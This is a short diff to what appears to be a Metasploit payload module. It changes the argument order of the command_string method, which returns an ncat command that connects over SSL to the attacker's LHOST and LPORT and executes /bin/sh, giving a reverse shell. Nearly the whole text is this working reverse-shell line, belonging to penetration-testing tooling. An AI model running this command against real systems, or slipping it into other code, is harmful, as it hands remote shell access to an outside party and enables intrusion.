@@ -45,7 +45,7 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "ncat --ssl #{datastore['LHOST']} #{datastore['LPORT']} -e /bin/sh "
+    "ncat -e /bin/sh --ssl #{datastore['LHOST']} #{datastore['LPORT']}"
   end
 
 end
